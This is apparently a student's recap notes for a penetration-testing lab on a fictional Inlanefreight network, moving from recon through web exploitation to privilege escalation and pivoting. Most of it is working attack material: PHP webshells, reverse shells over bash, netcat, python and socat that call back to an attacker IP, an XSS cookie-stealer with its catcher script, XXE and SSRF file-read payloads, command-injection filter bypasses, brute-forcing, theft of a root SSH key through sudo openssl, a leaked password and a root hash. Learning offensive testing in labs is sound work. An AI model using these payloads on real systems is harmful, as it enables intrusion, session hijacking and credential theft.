
**THIS SECTION IS LIKE A RECAP OF THIS FULL LEARNING. DO IT THOROUGHLY.** 


Given:

External Testing:	
- 10.129.x.x ("external" facing target host)	
- *.inlanefreight.local (all subdomains)	


Internal Testing:
- 172.16.8.0/23
- 172.16.9.0/23
- INLANEFREIGHT.LOCAL (Active Directory domain)


The following are out of scope for this assessment:

- Phishing/Social Engineering against any Inlanefreight employees or customers
- Physical attacks against Inlanefreight facilities
- Destructive actions or Denial of Service (DoS) testing
- Modifications to the environment without written consent from authorized Inlanefreight IT staff

# Phase 1: External Recon — Methodology 

Step by step, with commands.

| #   | Step                                                                 | Command                                                                                                                                                                            | Why                                                                                                                                                                                                                                                        |
| --- | -------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | Quick top-1000 scan (from scope file)                                | `sudo nmap --open -oA tcp_1k -iL scope`                                                                                                                                            | Fast first look — what's open, so you're not blind.                                                                                                                                                                                                        |
| 2   | Full port + version/OS/scripts scan                                  | `sudo nmap --open -p- -A -oA tcp_all -iL scope`                                                                                                                                    | Catches ports the top-1000 missed + tells you the exact service/version to attack.                                                                                                                                                                         |
| 3   | Pull just the running services from results                          | `egrep -v "^#\|Status: Up" tcp_all.gnmap \| cut -d ' ' -f4- \| tr ',' '\n' \| sed -e 's/^[ \t]*//' \| awk -F '/' '{print $7}' \| grep -v "^$" \| sort \| uniq -c \| sort -k 1 -nr` | Cuts the noisy output down to a clean service list you can plan attacks from. We can use this handy Nmap grep [cheatsheet](https://github.com/leonjza/awesome-nmap-grep) to "cut through the noise" and extract the most useful information from the scan. |
| 4   | See DNS (port 53) → try zone transfer for subdomains                 | `dig axfr inlanefreight.local @10.129.203.101`                                                                                                                                     | A misconfigured DNS hands you every subdomain for free = more targets, bigger scope. Direction: the server @ip sends its zone TO you — you receive, you don't transfer anything to it.                                                                     |
| 5   | If zone transfer fails → fuzz vhosts. First get the "not found" size | `curl -s -I http://10.129.203.101 -H "HOST: defnotvalid.inlanefreight.local" \| grep "Content-Length:"`                                                                            | You need the "doesn't exist" response size so you can filter it out next.                                                                                                                                                                                  |
| 6   | Fuzz vhosts, filter out that size (`-fs`)                            | `ffuf -w namelist.txt:FUZZ -u http://10.129.203.101/ -H 'Host:FUZZ.inlanefreight.local' -fs 15157`                                                                                 | Finds hidden vhosts the zone transfer missed; `-fs` hides the junk "not found" hits.                                                                                                                                                                       |
| 7   | Add all found subdomains to hosts file                               | `sudo tee -a /etc/hosts > /dev/null <<EOT`<br>`10.129.203.101 inlanefreight.local blog.inlanefreight.local careers.inlanefreight.local ...`<br>`EOT`                               | Your box must map those names to the IP, or the browser/tools can't reach them.                                                                                                                                                                            |

## If you're given ONLY a range (no single IP)

Don't scan the whole range blindly. Find who's alive first, then scan only those.

| # | Step | Command | Why |
|---|------|---------|-----|
| 1 | Ping sweep — find live hosts (no port scan) | `sudo nmap -sn 10.129.0.0/16 -oA live` | A range has thousands of IPs, most dead. Find the alive ones first so you don't waste hours scanning nothing. |
| 2 | Pull the live IPs into a file | `grep "Up" live.gnmap \| cut -d ' ' -f2 > targets.txt` | Turns the sweep result into a clean target list `-iL` can read. |
| 3 | Full scan only the live IPs | `sudo nmap --open -p- -A -iL targets.txt -oA full` | Now you deep-scan only real hosts — fast and focused instead of blasting the whole range. |

---

# PHASE 2 — Service Enumeration & Exploitation

Go service by service. Poke each open port, grab what you can, note findings, move on. Most orgs fall through **web**, so don't get stuck — enumerate services fast, then spend your time on HTTP.

| #   | Port / Service | Step                                  | Command                                                 | Why                                                                                                                                                |
| --- | -------------- | ------------------------------------- | ------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | 21 FTP         | Try anonymous login (nmap flagged it) | `ftp 10.129.203.101` → user `anonymous`, blank password | Anon FTP can leak/host files. Here: one `flag.txt`, no upload, no dir change → dead end.                                                           |
| 2   | 21 FTP         | Check upload                          | `ftp> put test.txt`                                     | If you can upload to a web-reachable dir = webshell. Here `550 Permission denied` → no.                                                            |
| 3   | 22 SSH         | Banner grab for version               | `nc -nv 10.129.203.101 22`                              | Version → known CVEs? OpenSSH 8.2 = none. Try some common creds to check if login is possible. Brute-force pointless with no usernames → dead end. |
| 4   | 25 SMTP        | Re-scan for misconfigs                | `sudo nmap -sV -sC -p25 10.129.203.101`                 | Shows `VRFY` etc. enabled → user enumeration possible.                                                                                             |
| 5   | 25 SMTP        | Enumerate valid users with `VRFY`     | `telnet 10.129.203.101 25` → `VRFY root`                | `252` = user exists, `550` = no. Builds a username list for later brute force. **Low finding** (reduce attack surface).                            |
| 6   | 25 SMTP        | Check for open relay                  | `nmap -p25 -Pn --script smtp-open-relay 10.129.203.101` | Open relay = phishing/spoofing abuse. Here closed = good for client.                                                                               |
| 7   | 110 POP3       | Try user enum with `USER`             | `telnet 10.129.203.101 110` → `user www-data`           | `+OK` = user exists. Here plaintext auth disallowed → no luck.                                                                                     |
| 8   | 111 rpcbind    | Probe it                              | `rpcinfo 10.129.203.101`                                | Shouldn't be exposed externally. Nothing useful back, but **Low finding** (unnecessary exposed service).                                           |
| 9   | 80 HTTP        | Move to web (the real attack surface) | enumerate each subdomain/vhost from Phase 1             | Modern orgs rarely fall to FTP/SSH RCE — web apps are the biggest surface. Spend most time here.                                                   |
How to know if rpcinfo gave you anything useful: `rpcinfo` is only useful if it lists a **real program you can act on** (like `nfs` or `mountd`) — then you chase it with `showmount -e IP` to find mountable shares and read files. If it shows **only `portmapper`** lines (your case), that's just rpcbind describing itself, no door to walk through → write it as a **Low finding** (exposed service) and move on. Same logic for any service: useful = it hands you a next step (cred / username / file / RCE); if it only describes itself (a banner, a version, its own config), note it and move on.

It’s a **general external-pentest rule**, Don't waste time on externally-facing services, do user-enum + a couple of weak passwords max — never full brute force; it's slow, noisy, risks locking accounts / crashing the service (DoS = out of scope), and rarely works. Note the finding and move to web.

But you can use reference of `Attacking Common Services`  and `footprinting` modules to give it a shot in scope.

Key mindset: external services (FTP/SSH/SMTP) are usually hardened → you mostly collect **Low/Medium findings** (VRFY enabled, rpcbind exposed) and note them for the report. The **foothold almost always comes from web (port 80)** — so enumerate services quickly, then pivot to attacking the web apps.

---

# PHASE 3 — Web Enumeration & Exploitation

This is where most time goes. External pentest = **cursory web testing, hunt the HIGH-risk bugs** (SQLi, file upload, XSS, XXE, LFI, command injection) — don't drown in tiny stuff (missing headers etc.); lump those into one Informational finding to cover yourself.

First triage: screenshot every subdomain/vhost fast so you know what to attack.

| Step | Command | Why |
|------|---------|-----|
| Screenshot all vhosts at once | `eyewitness -f subdomains.txt -d outdir` | 11 sites by eye = slow. EyeWitness grabs them all so you triage in seconds. |

Then go site by site. Each site = a tech to identify → a weak spot → a finding.


| #   | Subdomain  | What it is                     | Attack step                                                                                                                                                                                                                                                                                                                                                                                        | Command / payload                                                                                                                                                                                                                                                                                                                                                                                                              | Finding                                                                                                                                                                                                                                                                                                                                                            |
| --- | ---------- | ------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 1   | blog       | Drupal 9                       | fingerprint, try weak admin + register                                                                                                                                                                                                                                                                                                                                                             | `curl -s http://blog.inlanefreight.local \| grep Drupal`                                                                                                                                                                                                                                                                                                                                                                       | none (patched) → dead end, note "unused, take down"                                                                                                                                                                                                                                                                                                                |
| 2   | careers    | job site, register + upload CV | register, browse profile, tweak `id`                                                                                                                                                                                                                                                                                                                                                               | `http://careers.inlanefreight.local/profile?id=9` → change number                                                                                                                                                                                                                                                                                                                                                              | **IDOR** (read other users' profiles)                                                                                                                                                                                                                                                                                                                              |
| 3   | dev        | "Key Vault" login              | dir brute → find `upload.php` (access gives 403 but scan shows 200) →  in BURP `OPTIONS` shows methods → `TRACK` + `X-Custom-IP-Authorization: 127.0.0.1` reveals upload form → open this response with burpsuite --> upload PHP webshell `<?php system($_GET['cmd']); ?>` (save as random name e.g. `5351bf72.php`), bypass client-side check with `Content-Type: image/png`                      | `gobuster dir -u http://dev.inlanefreight.local -w common.txt -x .php -t 300` then `curl http://dev.inlanefreight.local/uploads/5351bf72.php?cmd=id` → `uid=33(www-data)`                                                                                                                                                                                                                                                      | **HTTP Verb Tampering** + **Unrestricted File Upload** (RCE)                                                                                                                                                                                                                                                                                                       |
| 4   | ir         | WordPress                      | WPScan plugins → `mail-masta` LFI; enum users → brute pass → log in → edit `404.php` for RCE. Pick one mode and stick with it — always sudo or always not. Mixing them leaves root-owned files your normal user trips over. sudo rm -rf /tmp/wpscan resets it anytime this happens. Login ---> find an inactive theme ---> edit the 404.php file for the inactive theme --> add php shell for RCE. | 1. `sudo wpscan -e ap --url http://ir...`<br>2. LFI: `curl http://ir.../wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`<br>3. `sudo wpscan -e u -t 500 --url http://ir...`<br>4. `sudo wpscan --url http://ir... -P pass.txt -U ilfreightwp`<br>5. edit `404.php`: `<?php system($_GET['cmd']); die(); ?>` → `curl "http://ir.inlanefreight.local/wp-content/themes/twentytwenty/404.php?cmd=id"` | **LFI** + **Weak WP Admin Creds** (RCE)                                                                                                                                                                                                                                                                                                                            |
| 5   | status     | log search app                 | single `'` throws MySQL error → UNION inject. Use SQLMAP --> capture the POST request using Burp, save it to a file, and mark any `=` searchitem parameter with a `*` so sqlmap knows where to inject                                                                                                                                                                                              | `' union select null, database(), user(), @@version -- //` ----> save the burp post with `*` after a parameter ----> `sqlmap -r file.txt --dump --batch --level=5 --risk=3`                                                                                                                                                                                                                                                    | **SQL Injection**                                                                                                                                                                                                                                                                                                                                                  |
| 6   | support    | IT ticket portal               | submit ticket with blind-XSS probe → confirm callback → drop cookie-stealer → steal admin session                                                                                                                                                                                                                                                                                                  | probe: `"><script src=http://OUR_IP:9000/TEST></script>` + `nc -lvnp 9000` ; then `script.js` = `new Image().src='http://OUR_IP:9200/index.php?c='+document.cookie` delivered via `"><script src=http://OUR_IP:9200/script.js></script>`                                                                                                                                                                                       | **XSS** (high — steals admin session)                                                                                                                                                                                                                                                                                                                              |
| 7   | tracking   | input → PDF generator          | inject JS/HTML into tracking field → PDF renders it → XHR local file read                                                                                                                                                                                                                                                                                                                          | `<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>`                                                                                                                                                                                                                                                                                    | **SSRF to Local File Read** (high). Read these [post](https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f), [excellent post](https://web.archive.org/web/20221207162417/https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/) on local file read via XSS in dynamically generated PDFS |
| 8   | vpn        | Fortinet SSL VPN               | version check, few weak creds (careful — lockout)                                                                                                                                                                                                                                                                                                                                                  | —                                                                                                                                                                                                                                                                                                                                                                                                                              | none (patched)                                                                                                                                                                                                                                                                                                                                                     |
| 9   | gitlab     | self-hosted GitLab             | register → browse `/explore` → find private project leaking a new subdomain                                                                                                                                                                                                                                                                                                                        | visit `http://gitlab.inlanefreight.local/explore`                                                                                                                                                                                                                                                                                                                                                                              | **Misconfigured GitLab** (high) → found `shopdev2`                                                                                                                                                                                                                                                                                                                 |
| 10  | shopdev2   | online store (from gitlab)     | weak creds `admin:admin` → checkout seems still under developed as per the comment given, burp it ---> sends XML → XXE                                                                                                                                                                                                                                                                             | `<!DOCTYPE userid [<!ENTITY xxetest SYSTEM "file:///etc/passwd">]>` then `&xxetest;` in `userid`                                                                                                                                                                                                                                                                                                                               | **XXE Injection** (high)                                                                                                                                                                                                                                                                                                                                           |
| 11  | monitoring | restricted console login       | Hydra brute login → `connection_test` hits success.. --> burp it ---> found`/ping.php` --> command injection, bypass filters                                                                                                                                                                                                                                                                       | `hydra -l admin -P pass.txt monitoring.inlanefreight.local http-post-form "/login.php:username=admin&password=^PASS^:Invalid Credentials!"` ; inject: `curl "http://monitoring.../ping.php?ip=127.0.0.1%0a'i'd"`                                                                                                                                                                                                               | **Command Injection** → `webdev` shell, box is dual-homed into `172.16.8.0/23` = pivot into AD                                                                                                                                                                                                                                                                     |

---
## 3. Burp: verb-tampering → upload → RCE (dev.inlanefreight.local)

1. **Reach upload.php.** GET was 403, so I used TRACK with the header `X-Custom-IP-Authorization: 127.0.0.1` and got the full page. TRACK alone gave an empty body — the trick was the IP header. The IP the server echoed back (`172.18.0.1`) is *my* blocked address, so I had to pretend to be localhost `127.0.0.1`. (POST or any verb not in the auth rule would also bypass the 403.)

2. **Tried PUT to write a shell.** `PUT /shell.php` returned 404, so I dropped it. A server that really lets you write files answers **201 Created** — a 404 means PUT-write isn't enabled, so it's a dead end, not worth pushing.

3. **Uploaded the webshell.** I set filename to `shell.php`, `Content-Type: image/png`, and put PHP in the body — it worked. The `.jpg/.png/.gif` limit on the page is only client-side, so Burp ignores it. This server was weak so a plain `.php` passed; if it had checked harder I'd use `image/gif` + `GIF8;` magic bytes, or `.phtml`/double extension. (How to tell client-side vs server-side: client-side blocks you *before* a request is sent — nothing shows in Burp; server-side rejects you *in a response*.)

4. **Shell came back empty (`Content-Length: 0`).** I wasted time thinking a content filter was stripping my code. The real problem: my payload was sitting in the `submit` part of the form, not the **`file`** part, so the saved file was empty. Lesson: `Content-Length: 0` means you uploaded an empty file, not that something filtered it.

5. **Got a 408 Timeout.** I just re-sent it in a new Repeater tab and it worked. A 408 is a connection glitch (transient) — retry it. Only answers like `403`/`404` are the app's real reply, and those you don't retry, you change something.

6. **After RCE.** I climbed folders with `ls ../../../`, but absolute paths like `ls /home/` are cleaner (no counting dots). `/root` showed empty because I'm `www-data` and don't have permission — that's normal until privesc. Spaces in the command must be `%20` (a bare `%` breaks the URL).

7. **Flag.** `find / -name flag.txt 2>/dev/null` found `/var/www/html/flag.txt`, then I read it with `cmd=cat%20/var/www/html/flag.txt`.

---
## 7.  Dynamically generated PDFs 

Some pages take what you type and turn it into a **PDF, image, or receipt** (invoices, report downloads, tracking slips). These are easy to attack because the server often builds that file using a **hidden browser** (like wkhtmltopdf or headless Chrome) — and that browser will **run your HTML and JavaScript**.

Test it step by step:

1. Type `<h1>test</h1>` into a field that shows up in the file.
2. Look at the file. If "test" comes out as a **big heading** (not the plain text `<h1>test</h1>`), the server is **running your HTML** — good sign.
3. Try `<script>document.write('hi')</script>`. If "hi" shows up, **JavaScript runs on the server** too.
4. Now make that JavaScript read a file on the server: an XHR request to `file:///etc/passwd`. If the file's contents appear in the PDF, you've got **local file read / SSRF** — a high finding.
5. Also point it at internal addresses: `http://127.0.0.1` (the server itself) and `169.254.169.254` (cloud secrets) to test **SSRF**.

Change the path to get the file's content as you cant `ls` or `cd` here.

```
file:///proc/self/cwd/flag.txt      ← app's own folder — best bet
file:///proc/self/cwd/
file:///var/www/flag.txt
file:///var/www/html/flag.txt
file:///var/www/
file:///flag.txt
file:///flag
file:///home/USER/flag.txt
file:///home/USER/user.txt
file:///tmp/flag.txt
```

Same habit every time: **inject `<h1>` → does it render? → then push to `<script>` → then to file read.**

---
## 11. Deep-dive: the `monitoring` command-injection (the confusing one for me)

1. **The "restricted shell" is a WEB PAGE, not a Linux terminal.** After hydra logs you in, the site shows a limited console (command list) — it's a PHP page that only lets you write a few actions like `connection_test`. 
2. When you type `connection_test` and hit enter, **nothing runs in your browser.** The page quietly sends your typed command to the server as an **HTTP request**t. Thats why if you try to catch them with burp, they get caught.

```
GET /ping.php?ip=127.0.0.1
```

Now you've found a hidden parameter (`ip=`) you couldn't see on the page = your injection point.

3. **You don't KNOW which injection works — you probe separators and read the error:**

| Try                      | Result           | Lesson                         |
| ------------------------ | ---------------- | ------------------------------ |
| `127.0.0.1;id`           | `Invalid input`  | `;` blacklisted                |
| `127.0.0.1\|id`          | `Invalid input`  | `\|` blacklisted               |
| `127.0.0.1%0a` (newline) | ping still works | `%0a` allowed ✅                |
| `127.0.0.1%0aid`         | `Invalid input`  | the word `id` is blocked       |
| `127.0.0.1%0a'i'd`       | runs `id` ✅      | quotes split the word → bypass |

4. **Dump the PHP to read the filter — it hands you its own bypass.** `GET /ping.php?ip=127.0.0.1%0a'c'at${IFS}ping.php` shows:

```php
$operators = ['&', '|', ';', '\\', '/', ' '];     // banned SYMBOLS
$words = ['whoami','id','curl','wget','nc', ...];  // banned WORDS
$cmd = "bash -c 'ping -c 1 " . $ip . "'";          // your input pasted into a ping command
```

Read the two lists, don't guess: space banned → use `${IFS}`; `;`/`|` banned → use `%0a`; word `id` banned → split it `'i'd`.

5. **socat** is the one reverse-shell tool NOT on the blacklist.** `nc`, `netcat`, `curl`, `wget`, `bash`, `ssh` are all banned, so every usual reverse shell is dead. You check which shell binaries survive:

```
GET /ping.php?ip=127.0.0.1%0a'w'h'i'ch${IFS}socat
→ /usr/bin/socat   (installed AND not blacklisted)
```

socat = a beefier netcat (catches/makes shells, also pivots). You reach for it only because everything else was filtered — found by checking `which`, not memorized.

### Finding the webroot flag on `monitoring` 

(filter bypass: `/`=`${PATH:0:1}`, space=`${IFS}`, words split with quotes)

1. **Find all flags** — `find / -name flag.txt`:

```
%0a'f'ind${IFS}${PATH:0:1}${IFS}-name${IFS}flag.txt
```

This found two, but they were the **wrong** ones (HTB wants the flag in the webroot):

- `%0a'c'at${IFS}${PATH:0:1}srv${PATH:0:1}ftp${PATH:0:1}flag.txt` → `HTB{0eb0ab788df18c3115ac43b1c06ae6c4}`
- `%0a'c'at${IFS}${PATH:0:1}home${PATH:0:1}srvadm${PATH:0:1}flag.txt` → `b447c27a00e3a348881b0030177000cd`

2. **Grep file contents for `HTB`** across the real data dirs:

```
%0a'g'rep${IFS}-rl${IFS}HTB${IFS}${PATH:0:1}var${IFS}${PATH:0:1}home${IFS}${PATH:0:1}opt${IFS}${PATH:0:1}srv
```

→ revealed /var/www/html/monitoring/00112233_flag.txt

3. **Read the webroot flag** (the accepted one):

```
%0a'c'at${IFS}${PATH:0:1}var${PATH:0:1}www${PATH:0:1}html${PATH:0:1}monitoring${PATH:0:1}00112233_flag.txt
```

Lesson: `find /` gives every `flag.txt` on the box (decoys included) — the graded one is in the **webroot** (`/var/www/html/...`). `grep -rl HTB` over `/var /home /opt /srv` pinpoints the real flag by its content. Empty `cat` output = wrong path (I'd missed the `html` folder).

---

## Full payloads 

### 1. Any webshell → real terminal (reverse shell)

PHP webshell (upload to dev — save as a random name):

```php
<?php system($_GET['cmd']); ?>
```

Run it:

```bash
curl http://dev.inlanefreight.local/uploads/5351bf72.php?cmd=id
```


A `?cmd=` webshell is one command at a time — upgrade it to an interactive shell. Works for ANY webshell (uploaded file, 404.php, command injection).

1. **Start a listener** on your box (tun0 IP = `10.10.14.51`):

```bash
nc -lvnp 9001
```

2. **Fire a reverse shell through the webshell** — put this in `cmd=`, URL-encoded:

```bash
curl "http://TARGET/shell.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/10.10.14.51/9001%200%3E%261'"
```

decoded that's: `bash -c 'bash -i >& /dev/tcp/10.10.14.51/9001 0>&1'`

3. Your `nc` catches the shell. **Stabilise it:**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'   # run in the caught shell
# then: Ctrl+Z
stty raw -echo; fg                                # back on your box

export TERM=xterm
```

Or make it fully interactive with **socat** (two terminals — lets you use su/sudo/ssh/editors):

```bash
# Terminal A (attack box, NEW window) — start the listener first:

socat file:`tty`,raw,echo=0 tcp-listen:4443

# Terminal B (your existing `nc` shell) — type this _into that shell_:

socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.134:4443
```

(The target is **reaching out to you again** — a second connection, this time from the target’s socat to your socat listener. “Connect back” = the target initiates the connection toward your attack box (same direction as the original reverse shell)..)

**If `bash` is blocked or nothing connects, try another payload** (same idea, URL-encode it):
- `nc -e /bin/bash 10.10.14.51 9001`
- `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.51",9001));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'`
- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.51 9001 >/tmp/f`

Grab ready-made ones from **revshells.com** (pick the payload, set your IP/port, copy). Encode spaces as `%20`, `>` as `%3E`, `&` as `%26`.



### 2. XSS  exploits

XSS cookie-stealer — `script.js` on your box:

```javascript
new Image().src='http://OUR_IP:9200/index.php?c='+document.cookie
```

XSS cookie-catcher - `index.php` on your box (saves cookies to cookies.txt):

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Start your server (hosts script.js + catches the cookie):

```bash
sudo php -S 0.0.0.0:9200
```

Deliver in the ticket:

```html
"><script src=http://OUR_IP:9200/script.js></script>
```

### 3. PDF / SSRF local file read (tracking):

```html
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(this.responseText)};
x.open("GET","file:///etc/passwd");
x.send();
</script>
```

### 4. XXE local file read (shopdev2 checkout XML):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE userid [
  <!ENTITY xxetest SYSTEM "file:///etc/passwd">
]>
<root>
    <subtotal>undefined</subtotal>
    <userid>&xxetest;</userid>
</root>
```

### 5. Command injection 

filter bypass (monitoring — newline `%0A` + single-quote word split):

```bash
curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'd"
```

```bash
curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'c'at${IFS}ping.php"
```

---

## Methodology: when you land on any external web page, check one by one

Go down the list in order. Don't skip just because one thing worked — the exam box may be vulnerable where this one wasn't.

1. **Fingerprint it** — version from `curl | grep generator`, headers, /readme.txt. Known CMS/version → search exploit-db.
2. **Run the scanner** if it's a CMS — `wpscan -e ap,u,t` (WordPress) / `droopescan scan drupal`.
3. **Enumerate users** → then brute their passwords (`wpscan -P`, or `hydra`).
4. **Try weak creds + auth bypass** on every login — `admin:admin`, `admin' OR '1'='1-- -`. Watch for **username enum** (different error for valid vs invalid user).
5. **Register an account** if you can → log in → check if you can self-escalate role or see things you shouldn't.
6. **Enumerate every form** — login, register, forgot-password, upload, contact. Each one is an input to attack.
7. **Inject into every field/parameter** one at a time:
    - `'` → SQL error = **SQLi** (also try time delay `' OR SLEEP(5)-- -`)
    - `<script>` → **XSS**
    - `../etc/passwd` → **LFI**
    - `;id` / `%0aid` → **command injection**
    - XML in the request body → **XXE**
8. **Tweak ID numbers** — `?id=9` → `?id=10` → see others' data = **IDOR**.
9. **Dir/file brute** — `gobuster`/`ffuf`; find hidden `upload.php`, `/uploads`, admin panels, backups. Note **directory listing** if open.
10. **File upload?** → upload a webshell, bypass the filter (`Content-Type: image/png`, double ext, magic bytes), then find where it landed (`/uploads`).
11. **Check HTTP methods** — `OPTIONS` → try `PUT`/`TRACK`. GET 403 but another verb 200 = **Verb Tampering**. Watch for weird headers.
12. **Login but no obvious function?** → fuzz login with Burp Intruder, **hydra** as last resort. After login, restricted console → **command injection** on its actions.
13. **Field an admin will later VIEW** (ticket, support, message) → **Blind XSS** with a callback → cookie-stealer → hijack admin session.
14. **Input turned into a PDF/image/preview?** → inject `<h1>`; if it renders, try `<script>`, then `file:///etc/passwd` = **SSRF / local file read**. Also test SSRF to `http://127.0.0.1` and `169.254.169.254`.
15. **Repo host (GitLab etc.)?** → register/log in → browse `/explore` and projects → hunt **creds, SSH keys, configs, new subdomains**.
16. **Stuck?** → research the weird behavior, note any dead end as checked, then **move on** to the next page.

## Key mindset notes

- **Always test registration + login forms**: user-enum, weak creds, auth bypass, SQLi (`'`), and IDOR by tweaking `id` numbers. Simple stuff (`admin:admin`) really works in production.
- **Filter bypasses** (command injection): newline `%0A` as the separator, single quotes to split blacklisted words (`'i'd`, `'c'at`), `${IFS}` for blocked spaces. Read the vulnerable script if you can (`cat ping.php`) to see the exact blacklist instead of guessing.
- **Dealing with the unexpected** (tracking PDF): you won't know every bug. Poke it, notice it's "off," Google the behavior ("pdf HTML injection"), read researcher writeups, adapt their payload. That research-and-adapt loop IS the pentester skill.
- **The goal of Phase 3**: one web app gives you a **foothold shell** (here: command injection on monitoring) on a box that also sits on the **internal network** (`172.16.8.0/23`) → that's your bridge from external into the AD domain (Phase 4).

---
---

# Phase 4: monitoring → reverse shell 

1. **Listener:** `nc -nvlp 8443`
2. **Socat reverse shell through the injection** (`socat TCP4:10.10.14.5:8443 EXEC:/bin/bash` split with quotes to dodge the filter), Do it either through BURP or curl.

```bash

curl -g 'http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0asocat${IFS}TCP4:10.10.14.134:8443${IFS}EXEC:bash'

# catch as webdev
```

3. **Upgrade to full TTY:** on attack box `socat file:`tty`,raw,echo=0 tcp-listen:4443`; in the webdev shell `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.51:4443`. (if fallback: `python3 -c 'import pty;pty.spawn("/bin/bash")'` → Ctrl+Z → `stty raw -echo; fg`)
4. **`id` shows `adm` group** → adm reads all `/var/log` → `aureport --tty | less` dumps typed keystrokes → leaked `srvadm:ILFreightnixadm!`.
5. **`su srvadm`** (password `ILFreightnixadm!`) → `/bin/bash -i` → now **`srvadm`**.

Chain: cmd injection → socat rev shell → TTY upgrade → `adm` group lets `aureport --tty` read audit log → leaks next user's password → `su`.

---
---
# Phase 5: persistence (SSH) → root privesc (sudo GTFOBin)

**Goal:** a stable "save point" to get back in each day, then escalate to root.

1. **SSH in with the creds** (stable access beats the shaky reverse shell):

```bash
ssh srvadm@<target-ip>        # password: ILFreightnixadm!
```

2. **Check privesc the lazy way** — We could upload an enumeration script to the system such as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), but always try two simple commands after gaining access: `id` to see if the compromised account is in any privileged local groups, and `sudo -l` to see if the account has any type of `sudo` privileges to run commands as another user or as root:

```bash
id             # any privileged groups?
sudo -l        # what can I run as root?
```

Here `sudo -l` showed: `(ALL) NOPASSWD: /usr/bin/openssl` → root can be reached via openssl. something simple such as `sudo su` without a password can work!

3. Running `sudo -l`, we see that we can run the `/usr/bin/openssl` command as root without requiring a password. As suspected, there is a [GTFOBin](https://gtfobins.github.io/gtfobins/openssl/) for the OpenSSL binary. The entry shows various ways this can be leveraged: to upload and download files, gain a reverse shell, and read and write files. Let's try this to see if we can grab the SSH private key for the root user. This is ideal over just attempting to read the `/etc/shadow` file or obtain a reverse shell as the `ida_rsa` private key file will grant us SSH back into the environment as the root user, which is perfect for setting up our pivots.

```bash
LFILE=/root/.ssh/id_rsa
sudo /usr/bin/openssl enc -in $LFILE
```

→ prints root's **private SSH key**.

4. **Persist as root** — save the key on your box, fix perms, SSH in:

```bash
# paste the key into dmz01_key on your attack box
chmod 600 dmz01_key
ssh -i dmz01_key root@<target-ip>
```

→ `root@dmz01` — permanent root access + a pivot point into the internal network.

Now if you wanna know the password of root for later use, grep it, hashcat it.`hashcat -m 1800......` or `john file wordlist`

```
root@dmz01:~# grep '^root:' /etc/shadow

root:$6$DRoCXYsAbM9eQQNB$EL8sgj0w2O.40xzikElyHtVYKS6OZIGWFUyLw6B787nY2X0rDMICZ/ieDLdoD7J4uHTYWdE18T9RKaKDehfqd1:19143:0:99999:7:::
```

Chain: `srvadm` creds → SSH (stable) → `sudo -l` finds `NOPASSWD openssl` → GTFOBins openssl reads `/root/.ssh/id_rsa` → SSH in as root.

Lesson: after any foothold run **`id` + `sudo -l` first** — privesc is usually a misconfigured sudo binary, not an exotic exploit. Any `NOPASSWD` binary → check **GTFOBins** for a read/write/shell trick. Stealing a **root SSH key** is better than a reverse shell: it's reusable, stable, and ideal for pivoting.

---
---

# Phase 6: pivoting + internal recon (reach the second network)

**The situation:** `dmz01` is **dual-homed** — it has two NICs: `ens160` = `10.129.x.x` (the network you came from) and `ens192` = `172.16.8.120` (an internal `172.16.8.0/23` subnet you can't touch directly). You use root on dmz01 as a **doorway** to tunnel your traffic into that hidden network.

#### Set up the tunnel — pick ONE

**Option A — SSH dynamic port forward + ProxyChains (simplest):**

1. Open a SOCKS proxy through your root SSH key:

```bash
ssh -D 8081 -i dmz01_key root@10.129.x.x
```
`-D 8081` = "open a SOCKS proxy on my local port 8081; anything I send there pops out of dmz01." Leave this terminal open.

2. Confirm it's listening (in another terminal):

```bash
netstat -antp | grep 8081      # 127.0.0.1:8081 LISTEN
```

3. Point ProxyChains at it — edit `/etc/proxychains.conf`, last line:

```
socks4  127.0.0.1 8081
```

4. Now prefix any tool with `proxychains` to send it through dmz01:

```bash
proxychains nmap -sT -p 21,22,80,8080 172.16.8.120    # -sT = TCP connect, REQUIRED through a proxy
```

⚠️ Through a proxy use **`nmap -sT` (TCP connect) only** — SYN/`-sS`, UDP, ping, and OS detection don't work over SOCKS. Expect it to be **slow**.

**Option B — Metasploit route (nicer if you're already in MSF):**

1. Build a Linux reverse-shell binary:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.x LPORT=443 -f elf > shell.elf
```

2. Copy it up with your key and run it:

```bash
scp -i dmz01_key shell.elf root@10.129.x.x:/tmp
# in msfconsole:
use exploit/multi/handler
